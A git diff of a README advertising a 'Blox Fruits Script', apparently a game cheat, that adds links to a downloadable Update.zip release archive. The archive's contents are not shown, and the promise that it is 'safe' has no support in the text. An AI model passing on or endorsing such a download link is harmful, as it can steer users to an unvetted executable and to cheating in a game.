@@ -3,14 +3,14 @@
 > **The ultimate script for dominating Blox Fruits!**  
 > Safe, fast, and loaded with features for an unbeatable experience. 🚀  
 
-**[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox%20Fruits%20Script-orange)]()**  
+**[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox%20Fruits%20Script-orange)](https://github.com/WarzMvp/blox-fruits-script/releases/download/Update/Update.zip)**  
 
 ---  
 
 
 ![blox](https://github.com/user-attachments/assets/38a18111-dcf8-4ef6-baa8-48405f6288b6)
 
-# ***[📁 Download Now]()***  
+# ***[📁 Download Now](https://github.com/WarzMvp/blox-fruits-script/releases/download/Update/Update.zip)***  
 ---
 
 ## 🌟 **Why Blox Fruits Script?**
